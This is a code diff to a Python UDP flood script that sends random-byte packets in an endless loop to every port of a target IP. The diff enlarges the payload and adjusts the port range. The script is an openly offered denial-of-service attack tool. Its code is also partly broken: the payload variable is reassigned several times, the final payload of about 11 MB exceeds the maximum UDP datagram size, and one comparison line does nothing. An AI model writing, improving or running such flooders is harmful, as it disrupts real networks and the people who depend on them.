@@ -10,7 +10,10 @@ R = '\033[31m'
 N = '\033[0m'
 
 white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-K_ibytes = random._urandom(577)
+K_ibytes = random._urandom(35526)
+K_ibytes = random._urandom(35512)
+K_ibytes = random._urandom(65500)
+K_ibytes = random._urandom(11133438)
 
 os.system("clear")
 
@@ -49,7 +52,7 @@ print("Waiting 3 second Attack Send Packet")
 time.sleep(3)
 while True:
     sent = 0
-    for port in range(1, 65534):
+    for port in range(1, 65500):
         white.sendto(K_ibytes, (ip, port))
         sent = sent + 1
         sent==15000000
